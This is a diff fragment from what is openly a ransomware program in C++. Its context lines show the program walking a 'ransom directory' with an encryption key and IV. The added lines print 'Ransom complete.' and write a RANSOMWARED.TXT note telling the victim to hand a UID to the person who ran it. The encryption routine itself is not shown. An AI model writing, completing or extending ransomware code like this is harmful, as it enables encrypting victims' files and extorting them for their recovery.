@@ -100,6 +100,10 @@ int main()
 					uid=uid.substr(0,40);
 					std::cout<<"UID is: "<<uid<<std::endl;
 					traverse_files(ransom_directory,key,iv,file_handler);
+					std::cout<<"Ransom complete."<<std::endl;
+					string_to_file("You've been ransomwared.\n"
+						"Please contact the script kiddie that used this and give them the following UID:\n"+
+						uid,ransom_directory+"/RANSOMWARED.TXT");
 					return 0;
 				}
 				uid+=data;
